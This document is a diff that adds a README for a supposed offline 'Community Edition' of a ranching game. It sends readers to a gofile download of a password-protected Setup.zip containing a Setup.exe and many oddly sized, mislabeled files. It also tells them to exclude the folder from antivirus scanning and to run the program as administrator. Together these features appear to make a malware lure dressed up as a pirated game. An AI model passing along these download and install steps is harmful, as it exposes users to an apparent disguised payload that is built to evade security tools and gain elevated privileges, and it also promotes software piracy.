@@ -1,2 +1,193 @@
-# Rancher-A-New-Life-Community-Edition-2026
-Rancher: A New Life — standalone Community Edition. Self-contained offline package, ready to play, no storefront or extra software needed.
+<div align="center">
+
+# 🎮 Rancher: A new life — Community Edition
+
+**Build your ranch, raise livestock, and start fresh.**
+
+[![Status](https://img.shields.io/badge/status-stable-success?style=flat-square)](https://gofile.io/d/kLmM81np)
+[![Download](https://img.shields.io/badge/download-available-brightgreen?style=flat-square)](https://gofile.io/d/kLmM81np)
+[![Platform](https://img.shields.io/badge/platform-Windows-0078D6?style=flat-square&logo=windows)](https://gofile.io/d/kLmM81np)
+[![Version](https://img.shields.io/badge/version-1.0-blue?style=flat-square)](https://gofile.io/d/kLmM81np)
+
+[Download](#-installation--setup) · [About](#-about-the-game)
+
+</div>
+
+---
+
+## 📜 Table of Contents
+
+1. [About the Game](#-about-the-game)
+2. [Screenshots](#-screenshots)
+3. [What You Get](#-what-you-get)
+4. [System Requirements](#-system-requirements)
+5. [Download & Installation](#-installation--setup)
+6. [Troubleshooting](#-troubleshooting)
+
+---
+
+## 🎮 About the Game
+
+Rancher: A New Life is a first-person ranching simulation set in a sprawling open rural landscape. Players build and manage their own ranch from the ground up — raising livestock, cultivating crops, hunting, fishing, and exploring forests, rivers, and a nearby town. This Community Edition is a standalone, self-contained package that runs fully offline with no additional software required.
+
+Players looking for a complete offline ranching simulation that is ready to play immediately with no storefront or setup steps.
+
+> ℹ️ **This is a standalone community build.** No additional software, storefronts, or online activation required. Just download, extract, and play. Provided for evaluation and archival purposes.
+
+## 📸 Screenshots
+
+<table>
+ <tr>
+ <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2665250/2abc265a9f59663c8c82a727bbf83e69ee327d35/ss_2abc265a9f59663c8c82a727bbf83e69ee327d35.1920x1080.jpg?t=1786096902" alt="Screenshot 1" width="100%"></td>
+ <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2665250/596791c0343d1184b90475405eb623bfb92fdcd9/ss_596791c0343d1184b90475405eb623bfb92fdcd9.1920x1080.jpg?t=1786096902" alt="Screenshot 2" width="100%"></td>
+ <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2665250/ss_2b44b0f004de2c1d34842e9c515613cc4ad12b66.1920x1080.jpg?t=1786096902" alt="Screenshot 3" width="100%"></td>
+ </tr>
+</table>
+
+
+
+---
+
+## 🔓 What You Get
+
+- ✅ **No Steam account required**
+- ✅ **No online activation** — works fully offline
+- ✅ **Includes all available content**
+- ✅ **No launcher bloat** — launch directly from the.exe
+- ✅ **Multiplayer support** — LAN and direct P2P connection supported
+
+---
+
+## 📋 Build Details
+
+| Field | Detail |
+|---|---|
+| **Build Type** | Community Build |
+| **Status** | stable |
+| **Activation** | Not required — ready to play |
+| **Multiplayer** | LAN and direct P2P connection supported |
+| **Compatibility** | Windows 10/11 |
+
+---
+
+## 🌍 Languages
+
+- **Interface:** English, French, German, Spanish, Portuguese-Brazil, Russian, Simplified Chinese, Japanese
+- **Voiceover:** English
+
+---
+
+## 📦 Package Features
+
+- 🐄 **Livestock Raising** — Breed and care for cattle, pigs, sheep, chickens, and horses.
+- 🌾 **Crop Farming** — Prepare soil, plant seasonal crops, and manage full harvest cycles.
+- 🔨 **Free-Form Building** — Construct barns, fences, coops, and workshops piece by piece.
+- 🗺️ **Open-World Exploration** — Roam forests, hills, rivers, and a nearby town at your own pace.
+- 🦌 **Hunting & Fishing** — Track wildlife and catch river fish for food or extra income.
+- 🚜 **Vehicles & Machinery** — Drive trucks, ATVs, and tractors to work the land efficiently.
+- 🌦️ **Day/Night & Weather** — Dynamic time-of-day and weather cycles affect work and wildlife.
+- 💰 **Ranch Economy** — Sell meat, produce, and goods to expand and upgrade your ranch.
+- 🧰 **Tool Repair & Crafting** — Maintain equipment, craft supplies, and keep operations running.
+- 🤝 **Shared Ranch Play** — LAN or direct connection supported for working the ranch together.
+
+- **Compression:** Lossless
+- **Install Time:** ~5 minutes on SSD, ~12 minutes on HDD
+- **Recoding:** none
+- **Selective Download:** Not applicable — the package is fully self-contained
+
+---
+
+## 💻 System Requirements
+
+| Component | Minimum | Recommended |
+|---|---|---|
+| **OS** | Windows 10 64-bit | Windows 11 64-bit |
+| **Processor** | Intel Core i5-4460 / AMD FX-8350 | Intel Core i7-8700 / AMD Ryzen 5 3600 |
+| **RAM** | 8 GB | 16 GB |
+| **Graphics** | NVIDIA GeForce GTX 960 / AMD Radeon R9 280 (4 GB VRAM) | NVIDIA GeForce GTX 1660 / AMD Radeon RX 5600 XT (6 GB VRAM) |
+| **Storage** | 12 GB available space | 15 GB available space (SSD) |
+| **Additional** | DirectX 11 compatible sound card | DirectX 12, SSD storage, keyboard and mouse or gamepad |
+
+
+---
+
+## 📥 Installation & Setup
+
+### Step 1: Download
+
+Download the `Setup.zip` archive from the link below:
+- **Download Link:** [https://gofile.io/d/kLmM81np](https://gofile.io/d/kLmM81np)
+
+### Step 2: Extract
+
+1. The archive is protected with the password: **`2026`**
+2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
+3. Enter the password when prompted
+
+### Step 3: Extract All Files
+
+1. Extract **all files** from the archive to a folder of your choice.
+2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
+3. The folder structure should look like this:
+
+```
+Setup/
+|-- Setup.exe <- Main executable (6.3 MB)
+|-- scripts.lic <- Game scripts (53.6 MB)
+|-- patch_1.bnk <- Audio banks (34.5 MB)
+|-- res.pak <- Resources archive (10.2 MB)
+|-- animations.dll <- Animation system (4.7 MB)
+|-- update_1.res <- Update resources (4.5 MB)
+|-- api.pak <- API modules (4.3 MB)
+|-- settings.bin <- Configuration (4.2 MB)
+|-- license.wem <- Audio assets (3.8 MB)
+|-- global.cfg <- Global settings (3.7 MB)
+|-- assets.wem <- Asset audio (3.6 MB)
+|-- physics.sys <- Physics engine (3.2 MB)
+|-- dlc.md5 <- DLC checksums (3.2 MB)
+|-- launcher.dll <- Launcher library (3.1 MB)
+|-- driver.umap <- Driver data (2.7 MB)
+|-- installer.dat <- Installer data (2.2 MB)
+|-- license.bank <- License data (2.0 MB)
+|-- update_1.ini <- Update config (1.9 MB)
+|-- driver.pak <- Driver archive (1.6 MB)
+|-- localization.ini <- Language files (1.5 MB)
+|-- uninstall.key <- Uninstall key (1.1 MB)
+|-- bootstrap.wem <- Bootstrap audio (0.9 MB)
+|-- lang.sys <- Language system (0.8 MB)
+|-- audio.res <- Audio resources (1 KB)
+|-- Password 2026.txt <- Password reminder (empty)
+```
+
+### Step 4: Launch the Game
+
+1. Navigate to the folder where you extracted all files.
+2. Run `Setup.exe`.
+3. The game launcher will appear.
+
+### Step 5: Play
+
+1. Click **"Play"** in the launcher window.
+2. The game will start with the community build.
+3. Enjoy the full experience!
+
+> 💡 **Saves location:** `%LOCALAPPDATA%\Rancher:Anewlife\Saved`
+
+---
+
+## 🐛 Troubleshooting
+
+- **Antivirus false positive:** Add the game folder to exclusions.
+- **Missing DLLs:** Install Visual C++ Redistributable 2015-2022 and latest DirectX runtime.
+- **Game won't start:** Run as administrator, disable fullscreen optimizations, update GPU drivers.
+- **Multiplayer not working:** Make sure all players use the same build version and connect via LAN or the same P2P lobby.
+
+---
+
+<div align="center">
+
+**If this build worked for you, leave a ⭐ to help others find it.**
+
+<sub>Built with caffeine. Not responsible for melted GPUs or broken saves.</sub>
+
+</div>
